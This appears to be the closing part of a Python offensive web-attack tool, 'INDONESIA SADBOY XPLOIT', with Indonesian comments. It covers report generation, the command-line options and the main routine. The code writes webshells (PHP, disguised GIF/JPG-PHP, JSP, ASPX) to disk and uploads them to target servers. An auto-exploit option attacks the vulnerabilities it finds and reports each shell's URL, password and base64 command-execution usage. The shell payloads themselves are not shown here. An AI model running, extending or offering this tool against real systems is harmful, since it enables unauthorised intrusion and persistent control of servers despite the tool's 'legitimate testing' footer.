            <h3>Cross-Site Request Forgery (CSRF) <span class="badge-danger">{len(web_vulnerabilities['csrf'])} found</span></h3>
"""
                        for vuln in web_vulnerabilities['csrf']:
                            html_template += f"""
            <div class="vulnerability">
                <h4>CSRF at {vuln.get('url', 'N/A')}</h4>
                <p><strong>Method:</strong> {vuln.get('method', 'N/A')}</p>
                <p><strong>Evidence:</strong> {vuln.get('evidence', 'N/A')}</p>
            </div>
"""
                    
                    # Clickjacking Vulnerabilities
                    if 'clickjacking' in web_vulnerabilities and web_vulnerabilities['clickjacking']:
                        html_template += f"""
            <h3>Clickjacking <span class="badge-danger">{len(web_vulnerabilities['clickjacking'])} found</span></h3>
"""
                        for vuln in web_vulnerabilities['clickjacking']:
                            html_template += f"""
            <div class="vulnerability">
                <h4>Clickjacking at {vuln.get('url', 'N/A')}</h4>
                <p><strong>Evidence:</strong> {vuln.get('evidence', 'N/A')}</p>
            </div>
"""
                    
                    # Sensitive Files
                    if 'sensitive_files' in web_vulnerabilities and web_vulnerabilities['sensitive_files']:
                        html_template += f"""
            <h3>Sensitive Files <span class="badge-danger">{len(web_vulnerabilities['sensitive_files'])} found</span></h3>
"""
                        for vuln in web_vulnerabilities['sensitive_files']:
                            html_template += f"""
            <div class="vulnerability">
                <h4>Sensitive File at {vuln.get('url', 'N/A')}</h4>
                <p><strong>Status Code:</strong> {vuln.get('status_code', 'N/A')}</p>
                <p><strong>Content Length:</strong> {vuln.get('content_length', 'N/A')}</p>
                <p><strong>Evidence:</strong> {vuln.get('evidence', 'N/A')}</p>
            </div>
"""
                    
                    html_template += "        </div>\n"
                
                # Tambahkan bagian kerentanan upload jika ada
                if 'upload_vulnerabilities' in self.results and self.results['upload_vulnerabilities'].get('vulnerable', False):
                    upload_vulnerabilities = self.results['upload_vulnerabilities']
                    html_template += f"""
        <div class="section">
            <h2>Upload Vulnerabilities</h2>
            <div class="vulnerability">
                <h4>Upload Vulnerability Level: <span class="badge-danger">{upload_vulnerabilities.get('vulnerability_level', 'Unknown')}</span></h4>
                <p><strong>Message:</strong> {upload_vulnerabilities.get('message', 'N/A')}</p>
"""
                    
                    # Tampilkan hasil test upload jika ada
                    if 'results' in upload_vulnerabilities and upload_vulnerabilities['results']:
                        html_template += f"""
                <h4>Upload Test Results:</h4>
                <table>
                    <tr>
                        <th>Filename</th>
                        <th>URL</th>
                        <th>Status</th>
                    </tr>
"""
                        
                        for result in upload_vulnerabilities['results']:
                            if result.get('status') == 'success':
                                html_template += f"""
                    <tr>
                        <td>{result.get('filename', 'N/A')}</td>
                        <td><a href="{result.get('url', '#')}" target="_blank">{result.get('url', 'N/A')}</a></td>
                        <td><span class="badge-success">Success</span></td>
                    </tr>
"""
                        
                        html_template += f"""
                </table>
"""
                    
                    html_template += f"""
            </div>
        </div>
"""
                
                # Tambahkan bagian shell yang telah diupload jika ada
                if 'shells_uploaded' in self.results and self.results['shells_uploaded']:
                    shells_uploaded = self.results['shells_uploaded']
                    html_template += f"""
        <div class="section">
            <h2>Shells Uploaded <span class="badge-danger">{len(shells_uploaded)} shells</span></h2>
"""
                    
                    for shell_id, shell_info in shells_uploaded.items():
                        shell_type = shell_info.get('type', 'Unknown')
                        shell_url = shell_info.get('url', 'Unknown')
                        shell_password = shell_info.get('password', 'N/A')
                        shell_usage = shell_info.get('usage', '')
                        
                        html_template += f"""
            <div class="shell-info">
                <h4>Shell ID: {shell_id}</h4>
                <p><strong>Type:</strong> {shell_type}</p>
                <p><strong>URL:</strong> <a href="{shell_url}" target="_blank">{shell_url}</a></p>
                <p><strong>Password:</strong> {shell_password}</p>
"""
                        if shell_usage:
                            html_template += f"""
                <p><strong>Usage:</strong> {shell_usage}</p>
"""
                        
                        html_template += f"""
                <p><strong>Upload Time:</strong> {shell_info.get('upload_time', 'N/A')}</p>
            </div>
"""
                    
                    html_template += f"""
        </div>
"""
                
                # Tambahkan footer
                html_template += f"""
        <div class="footer">
            <p>INDONESIA SADBOY XPLOIT - Report generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p>Untuk pengujian keamanan yang sah</p>
        </div>
    </div>
</body>
</html>
"""
                
                # Tulis ke file
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(html_template)
                self.log(f"Laporan HTML disimpan ke: {output_file}", "SUCCESS")
            except Exception as e:
                self.log(f"Error saat menyimpan laporan HTML: {str(e)}", "ERROR")
        
        elif output_format == 'txt':
            try:
                # Format laporan teks
                report = f"""
==========================================================================
                INDONESIA SADBOY XPLOIT - Report                  
==========================================================================

Scan Information:
----------------
Target          : {self.results.get('target', 'N/A')}
Scan Time       : {self.results.get('scan_time', 'N/A')}
Scan Duration   : {self.results.get('scan_duration', 'N/A')}
Scan Types      : {', '.join(self.results.get('scan_types', []))}

"""
                
                # Domain Information
                if 'domain_info' in self.results and self.results['domain_info']:
                    report += f"""
Domain Information:
-----------------
"""
                    
                    # WHOIS Information
                    if 'whois' in self.results['domain_info'] and self.results['domain_info']['whois']:
                        whois_data = self.results['domain_info']['whois']
                        report += f"""
WHOIS Information:
Registrar       : {whois_data.get('registrar', 'N/A')}
Creation Date   : {whois_data.get('creation_date', 'N/A')}
Expiration Date : {whois_data.get('expiration_date', 'N/A')}
Status          : {str(whois_data.get('status', 'N/A'))}
Name Servers    : {', '.join(whois_data.get('name_servers', ['N/A']))}
"""
                    
                    # DNS Records
                    if 'dns_records' in self.results['domain_info'] and self.results['domain_info']['dns_records']:
                        dns_records = self.results['domain_info']['dns_records']
                        report += f"""
DNS Records:
"""
                        for record_type, records in dns_records.items():
                            if records:
                                report += f"\n{record_type} Records:\n"
                                for record in records:
                                    report += f"- {record}\n"
                    
                    # Subdomains
                    if 'subdomains' in self.results['domain_info'] and self.results['domain_info']['subdomains']:
                        subdomains = self.results['domain_info']['subdomains']
                        report += f"""
Subdomains:
"""
                        for subdomain in subdomains:
                            report += f"- {subdomain.get('subdomain', 'N/A')} : {', '.join(subdomain.get('ip_addresses', ['N/A']))}\n"
                
                # Port Scan Results
                if 'port_scan' in self.results and self.results['port_scan']:
                    port_scan_results = self.results['port_scan']
                    report += f"""
Port Scan Results:
----------------
{'PORT':<10}{'STATUS':<10}{'SERVICE':<15}{'BANNER':<30}
{'-' * 65}
"""
                    for port_info in port_scan_results:
                        banner = port_info.get('banner', '')[:30]
                        report += f"{port_info.get('port', 'N/A'):<10}{port_info.get('state', 'N/A'):<10}{port_info.get('service', 'N/A'):<15}{banner:<30}\n"
                
                # Web Vulnerabilities
                if 'web_vulnerabilities' in self.results and self.results['web_vulnerabilities']:
                    web_vulnerabilities = self.results['web_vulnerabilities']
                    report += f"""
Web Vulnerabilities:
-----------------
"""
                    
                    # XSS Vulnerabilities
                    if 'xss' in web_vulnerabilities and web_vulnerabilities['xss']:
                        report += f"\nCross-Site Scripting (XSS) - {len(web_vulnerabilities['xss'])} found:\n"
                        for vuln in web_vulnerabilities['xss']:
                            report += f"""
- URL        : {vuln.get('url', 'N/A')}
  Method     : {vuln.get('method', 'N/A')}
  Parameter  : {vuln.get('parameter', 'N/A')}
  Payload    : {vuln.get('payload', 'N/A')}
  Evidence   : {vuln.get('evidence', 'N/A')}
"""
                    
                    # SQLi Vulnerabilities
                    if 'sqli' in web_vulnerabilities and web_vulnerabilities['sqli']:
                        report += f"\nSQL Injection - {len(web_vulnerabilities['sqli'])} found:\n"
                        for vuln in web_vulnerabilities['sqli']:
                            report += f"""
- URL        : {vuln.get('url', 'N/A')}
  Method     : {vuln.get('method', 'N/A')}
  Parameter  : {vuln.get('parameter', 'N/A')}
  Payload    : {vuln.get('payload', 'N/A')}
  Evidence   : {vuln.get('evidence', 'N/A')}
"""
                    
                    # LFI Vulnerabilities
                    if 'lfi' in web_vulnerabilities and web_vulnerabilities['lfi']:
                        report += f"\nLocal File Inclusion (LFI) - {len(web_vulnerabilities['lfi'])} found:\n"
                        for vuln in web_vulnerabilities['lfi']:
                            report += f"""
- URL        : {vuln.get('url', 'N/A')}
  Method     : {vuln.get('method', 'N/A')}
  Parameter  : {vuln.get('parameter', 'N/A')}
  Payload    : {vuln.get('payload', 'N/A')}
  Evidence   : {vuln.get('evidence', 'N/A')}
"""
                    
                    # RFI Vulnerabilities
                    if 'rfi' in web_vulnerabilities and web_vulnerabilities['rfi']:
                        report += f"\nRemote File Inclusion (RFI) - {len(web_vulnerabilities['rfi'])} found:\n"
                        for vuln in web_vulnerabilities['rfi']:
                            report += f"""
- URL        : {vuln.get('url', 'N/A')}
  Method     : {vuln.get('method', 'N/A')}
  Parameter  : {vuln.get('parameter', 'N/A')}
  Payload    : {vuln.get('payload', 'N/A')}
  Evidence   : {vuln.get('evidence', 'N/A')}
"""
                    
                    # Open Redirect Vulnerabilities
                    if 'open_redirect' in web_vulnerabilities and web_vulnerabilities['open_redirect']:
                        report += f"\nOpen Redirect - {len(web_vulnerabilities['open_redirect'])} found:\n"
                        for vuln in web_vulnerabilities['open_redirect']:
                            report += f"""
- URL        : {vuln.get('url', 'N/A')}
  Method     : {vuln.get('method', 'N/A')}
  Parameter  : {vuln.get('parameter', 'N/A')}
  Payload    : {vuln.get('payload', 'N/A')}
  Evidence   : {vuln.get('evidence', 'N/A')}
"""
                    
                    # CSRF Vulnerabilities
                    if 'csrf' in web_vulnerabilities and web_vulnerabilities['csrf']:
                        report += f"\nCross-Site Request Forgery (CSRF) - {len(web_vulnerabilities['csrf'])} found:\n"
                        for vuln in web_vulnerabilities['csrf']:
                            report += f"""
- URL        : {vuln.get('url', 'N/A')}
  Method     : {vuln.get('method', 'N/A')}
  Evidence   : {vuln.get('evidence', 'N/A')}
"""
                    
                    # Clickjacking Vulnerabilities
                    if 'clickjacking' in web_vulnerabilities and web_vulnerabilities['clickjacking']:
                        report += f"\nClickjacking - {len(web_vulnerabilities['clickjacking'])} found:\n"
                        for vuln in web_vulnerabilities['clickjacking']:
                            report += f"""
- URL        : {vuln.get('url', 'N/A')}
  Evidence   : {vuln.get('evidence', 'N/A')}
"""
                    
                    # Sensitive Files
                    if 'sensitive_files' in web_vulnerabilities and web_vulnerabilities['sensitive_files']:
                        report += f"\nSensitive Files - {len(web_vulnerabilities['sensitive_files'])} found:\n"
                        for vuln in web_vulnerabilities['sensitive_files']:
                            report += f"""
- URL        : {vuln.get('url', 'N/A')}
  Status Code: {vuln.get('status_code', 'N/A')}
  Content Len: {vuln.get('content_length', 'N/A')}
  Evidence   : {vuln.get('evidence', 'N/A')}
"""
                
                # Upload Vulnerabilities
                if 'upload_vulnerabilities' in self.results and self.results['upload_vulnerabilities'].get('vulnerable', False):
                    upload_vulnerabilities = self.results['upload_vulnerabilities']
                    report += f"""
Upload Vulnerabilities:
--------------------
Vulnerability Level: {upload_vulnerabilities.get('vulnerability_level', 'Unknown')}
Message: {upload_vulnerabilities.get('message', 'N/A')}
"""
                    
                    # Tampilkan hasil test upload jika ada
                    if 'results' in upload_vulnerabilities and upload_vulnerabilities['results']:
                        report += f"\nUpload Test Results:\n"
                        
                        for result in upload_vulnerabilities['results']:
                            if result.get('status') == 'success':
                                report += f"""
- Filename: {result.get('filename', 'N/A')}
  URL: {result.get('url', 'N/A')}
  Status: Success
"""
                
                # Shells Uploaded
                if 'shells_uploaded' in self.results and self.results['shells_uploaded']:
                    shells_uploaded = self.results['shells_uploaded']
                    report += f"""
Shells Uploaded ({len(shells_uploaded)} shells):
--------------------
"""
                    
                    for shell_id, shell_info in shells_uploaded.items():
                        shell_type = shell_info.get('type', 'Unknown')
                        shell_url = shell_info.get('url', 'Unknown')
                        shell_password = shell_info.get('password', 'N/A')
                        shell_usage = shell_info.get('usage', '')
                        
                        report += f"""
- Shell ID: {shell_id}
  Type: {shell_type}
  URL: {shell_url}
  Password: {shell_password}
"""
                        if shell_usage:
                            report += f"  Usage: {shell_usage}\n"
                        
                        report += f"  Upload Time: {shell_info.get('upload_time', 'N/A')}\n"
                
                # Footer
                report += f"""
==========================================================================
INDONESIA SADBOY XPLOIT - Report generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Untuk pengujian keamanan yang sah
==========================================================================
"""
                
                # Tulis ke file
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(report)
                self.log(f"Laporan teks disimpan ke: {output_file}", "SUCCESS")
            except Exception as e:
                self.log(f"Error saat menyimpan laporan teks: {str(e)}", "ERROR")
        
        else:
            self.log(f"Format laporan '{output_format}' tidak didukung.", "ERROR")


# Fungsi argparse untuk command-line interface
def parse_arguments():
    """Parse argumen CLI"""
    parser = argparse.ArgumentParser(
        description="INDONESIA SADBOY XPLOIT - Alat Pengujian Keamanan Web Komprehensif",
        epilog="Contoh: python Indosadxploit.py -t example.com -s domain,port,web_vuln -o html"
    )
    
    parser.add_argument("-t", "--target", help="Target untuk dipindai (domain atau URL)", required=True)
    parser.add_argument("-s", "--scan-types", help="Jenis pemindaian yang akan dilakukan (domain,port,web_vuln,upload_vuln)", default="domain,port,web_vuln,upload_vuln")
    parser.add_argument("-o", "--output-format", help="Format output laporan (json,html,txt)", default="html")
    parser.add_argument("-f", "--output-file", help="Nama file output untuk laporan")
    parser.add_argument("-p", "--ports", help="Port yang akan dipindai (misalnya 80,443,8080)")
    parser.add_argument("-w", "--generate-webshell", help="Generate webshell (php,php_mini,gif_php,php_img,jsp,aspx)")
    parser.add_argument("-u", "--url-upload", help="URL target untuk uji upload")
    parser.add_argument("-e", "--exploit", help="Otomatis eksploitasi kerentanan yang ditemukan", action="store_true")
    parser.add_argument("-v", "--verbose", help="Tampilkan output verbose", action="store_true")
    parser.add_argument("--upload-shell", help="Upload shell ke URL target (php,php_mini,gif_php,php_img,jsp,aspx)", metavar="SHELL_TYPE")
    parser.add_argument("--shell-dir", help="Direktori tujuan untuk upload shell", default=None)
    parser.add_argument("--version", help="Tampilkan informasi versi", action="version", version=f"INDONESIA SADBOY XPLOIT v{VERSION} - {CODENAME}")
    
    return parser.parse_args()


# Main function
def main():
    """Fungsi utama program"""
    print(BANNER)
    time.sleep(1)
    
    args = parse_arguments()
    
    # Generate webshell jika diminta
    if args.generate_webshell:
        shell_type = args.generate_webshell.lower()
        generator = PayloadGenerator()
        
        if shell_type == 'php':
            output_file = os.path.join(OUTPUT_DIR, f"shell_{TIMESTAMP}.php")
            shell_content, shell_id, shell_password = generator.generate_php_shell_payload()
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(shell_content)
            print(f"{Fore.GREEN}[SUCCESS] PHP webshell dibuat di: {output_file}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[INFO] Shell ID: {shell_id}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[INFO] Password: {shell_password}{Style.RESET_ALL}")
        elif shell_type == 'php_mini':
            output_file = os.path.join(OUTPUT_DIR, f"mini_shell_{TIMESTAMP}.php")
            shell_content, shell_id, shell_password = generator.generate_php_mini_shell()
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(shell_content)
            print(f"{Fore.GREEN}[SUCCESS] PHP mini shell dibuat di: {output_file}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[INFO] Shell ID: {shell_id}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[INFO] Password: {shell_password}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[INFO] Usage: {args.target}?{shell_password}=BASE64_ENCODED_PHP_CODE{Style.RESET_ALL}")
        elif shell_type == 'gif_php':
            output_file = os.path.join(OUTPUT_DIR, f"shell_{TIMESTAMP}.gif")
            shell_content, shell_id, shell_password = generator.generate_gif_php_shell()
            with open(output_file, 'wb') as f:
                f.write(shell_content)
            print(f"{Fore.GREEN}[SUCCESS] GIF+PHP shell dibuat di: {output_file}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[INFO] Shell ID: {shell_id}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[INFO] Password: {shell_password}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[INFO] Usage: {args.target}?{shell_password}=BASE64_ENCODED_PHP_CODE{Style.RESET_ALL}")
        elif shell_type == 'php_img':
            output_file = os.path.join(OUTPUT_DIR, f"shell_{TIMESTAMP}.php.jpg")
            shell_content, shell_id, shell_password = generator.generate_php_img_shell()
            with open(output_file, 'wb') as f:
                f.write(shell_content)
            print(f"{Fore.GREEN}[SUCCESS] PHP+JPG shell dibuat di: {output_file}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[INFO] Shell ID: {shell_id}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[INFO] Password: {shell_password}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[INFO] Usage: {args.target}?{shell_password}=BASE64_ENCODED_PHP_CODE{Style.RESET_ALL}")
        elif shell_type == 'jsp':
            output_file = os.path.join(OUTPUT_DIR, f"shell_{TIMESTAMP}.jsp")
            shell_content, shell_id = generator.generate_jsp_shell()
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(shell_content)
            print(f"{Fore.GREEN}[SUCCESS] JSP shell dibuat di: {output_file}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[INFO] Shell ID: {shell_id}{Style.RESET_ALL}")
        elif shell_type == 'aspx':
            output_file = os.path.join(OUTPUT_DIR, f"shell_{TIMESTAMP}.aspx")
            shell_content, shell_id = generator.generate_aspx_shell()
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(shell_content)
            print(f"{Fore.GREEN}[SUCCESS] ASPX shell dibuat di: {output_file}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[INFO] Shell ID: {shell_id}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[ERROR] Tipe webshell tidak didukung. Gunakan php, php_mini, gif_php, php_img, jsp, atau aspx.{Style.RESET_ALL}")
        return
    
    # Cek apakah ada permintaan upload shell
    if args.upload_shell:
        scanner = Indosadxploit(verbose=args.verbose)
        scanner.log(f"Memulai upload shell ke target: {args.target}", "INFO")
        shell_result = scanner.uploader.upload_shell_to_server(args.target, shell_type=args.upload_shell)
        
        if shell_result.get('success', False):
            scanner.log(f"Upload shell berhasil!", "SUCCESS")
            shell_info = shell_result.get('shell_info', {})
            scanner.log(f"Shell URL: {shell_info.get('url', 'Unknown')}", "SUCCESS")
            scanner.log(f"Shell ID: {list(shell_info.keys())[0] if shell_info else 'Unknown'}", "SUCCESS")
            
            if 'password' in shell_info:
                scanner.log(f"Shell Password: {shell_info.get('password', 'N/A')}", "SUCCESS")
            
            if 'usage' in shell_info:
                scanner.log(f"Shell Usage: {shell_info.get('usage', '')}", "SUCCESS")
        else:
            scanner.log(f"Upload shell gagal: {shell_result.get('message', 'Unknown error')}", "ERROR")
        return
    
    # Cek apakah ada URL untuk upload
    if args.url_upload:
        scanner = Indosadxploit(verbose=args.verbose)
        scanner.log(f"Memulai pengujian upload ke: {args.url_upload}", "INFO")
        upload_result = scanner.uploader.test_upload_vulnerability(args.url_upload, use_shell=args.exploit)
        
        if upload_result.get('vulnerable', False):
            scanner.log(f"Target rentan terhadap upload file! Level: {upload_result.get('vulnerability_level', 'Unknown')}", "SUCCESS")
            
            # Tampilkan informasi test
            results = upload_result.get('results', [])
            for result in results:
                if result.get('status') == 'success':
                    scanner.log(f"Upload berhasil: {result.get('filename', 'Unknown')} -> {result.get('url', 'Unknown')}", "SUCCESS")
            
            # Tampilkan informasi shell jika diupload
            if args.exploit and upload_result.get('shells_uploaded', 0) > 0:
                scanner.log(f"Shell berhasil diupload! Total: {upload_result.get('shells_uploaded', 0)}", "SUCCESS")
                
                for shell_id, shell_info in upload_result.get('uploaded_payloads', {}).items():
                    scanner.log(f"Shell ID: {shell_id}", "SUCCESS")
                    scanner.log(f"Shell URL: {shell_info.get('url', 'Unknown')}", "SUCCESS")
                    scanner.log(f"Shell Password: {shell_info.get('password', 'N/A')}", "SUCCESS")
                    
                    if 'usage' in shell_info:
                        scanner.log(f"Shell Usage: {shell_info.get('usage', '')}", "SUCCESS")
        else:
            scanner.log(f"Target tidak rentan terhadap upload file.", "WARNING")
        return
    
    # Melakukan pemindaian target
    scanner = Indosadxploit(verbose=args.verbose)
    
    # Parsing scan types
    scan_types = args.scan_types.split(',')
    
    # Parsing port list jika ada
    if args.ports:
        port_list = [int(p) for p in args.ports.split(',')]
        scanner.port_scanner = PortScanner(verbose=args.verbose)
    else:
        port_list = None
    
    # Melakukan pemindaian
    scanner.log(f"Memulai pemindaian pada target: {args.target}", "INFO")
    result = scanner.scan_target(args.target, scan_types, exploit=args.exploit)
    
    # Tampilkan ringkasan hasil
    scanner.log("Ringkasan hasil pemindaian:", "INFO")
    
    # Domain info summary
    if 'domain_info' in result and result['domain_info']:
        scanner.log(f"Informasi domain: Ditemukan {len(result['domain_info'].get('dns_records', {}))} DNS records dan {len(result['domain_info'].get('subdomains', []))} subdomain", "INFO")
    
    # Port summary
    if 'port_scan' in result and result['port_scan']:
        scanner.log(f"Pemindaian port: Ditemukan {len(result['port_scan'])} port terbuka", "INFO")
    
    # Web vulnerabilities summary
    if 'web_vulnerabilities' in result:
        total_web_vulns = sum(len(vulns) for vulns in result['web_vulnerabilities'].values() if isinstance(vulns, list))
        scanner.log(f"Kerentanan web: Ditemukan {total_web_vulns} kerentanan", "INFO")
        
        # Detail per kategori
        for vuln_type, vulns in result['web_vulnerabilities'].items():
            if isinstance(vulns, list) and vulns:
                scanner.log(f"- {vuln_type}: {len(vulns)} kerentanan", "INFO")
    
    # Upload vulnerabilities summary
    if 'upload_vulnerabilities' in result and result['upload_vulnerabilities'].get('vulnerable', False):
        scanner.log(f"Kerentanan upload: Ditemukan kerentanan level {result['upload_vulnerabilities'].get('vulnerability_level', 'Unknown')}", "INFO")
    
    # Shells uploaded summary
    if 'shells_uploaded' in result and result['shells_uploaded']:
        scanner.log(f"Shell terupload: {len(result['shells_uploaded'])} shell berhasil diupload!", "SUCCESS")
        
        # Informasi shell
        for shell_id, shell_info in result['shells_uploaded'].items():
            scanner.log(f"- Shell ID: {shell_id}", "SUCCESS")
            scanner.log(f"  URL: {shell_info.get('url', 'Unknown')}", "SUCCESS")
            scanner.log(f"  Password: {shell_info.get('password', 'N/A')}", "SUCCESS")
    
    # Generate laporan
    scanner.generate_report(args.output_format, args.output_file)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[ABORTED] Operasi dibatalkan oleh pengguna.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[ERROR] Terjadi kesalahan: {str(e)}{Style.RESET_ALL}")